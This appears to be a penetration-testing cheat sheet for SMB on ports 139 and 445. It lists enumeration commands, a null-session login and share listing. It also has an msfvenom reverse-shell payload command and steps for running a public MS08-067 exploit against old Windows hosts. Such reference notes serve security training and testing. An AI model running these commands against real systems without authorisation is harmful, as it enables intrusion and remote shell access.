# 139, 445 - SMB

## Enumeration

### General

* [Nmap](../../toolbox/network/nmap.md#smb-scanning)
* [nbtscan](../../toolbox/network/nbtscan.md) -r \<IP range>
* [enum4linux.pl](../../toolbox/network/enum4linux.md)

### Retrieve Server Version

Samba:

```
#term1
sudo ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' port 139

#term2
echo exit | smbclient -L 10.0.0.1
```

Windows:

* Use Wireshark. But it is more complex than just a version.

### Testing NULL Connect

```
rpcclient -U '' -N 10.0.0.1
```

### Enumerate Shares

```
crackmapexec smb 10.0.0.1 -u 'a' -p '' --shares
```

## Mounting Share

```
mount -t cifs -o username=<user>,password=<pass> //<IP>/<share> /mnt/folder/
```

## Exploits

### MS08-067

Script source: [https://github.com/andyacer/ms08\_067](https://github.com/andyacer/ms08\_067)

Generate shellcode:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -a x86 -f c
```

Execution (Python 2):

```
python ms08_067_2018.py <target_ip> 1 445 #Target OS: WinXP
python ms08_067_2018.py <target_ip> 2 139 #Target OS: Win2000
```

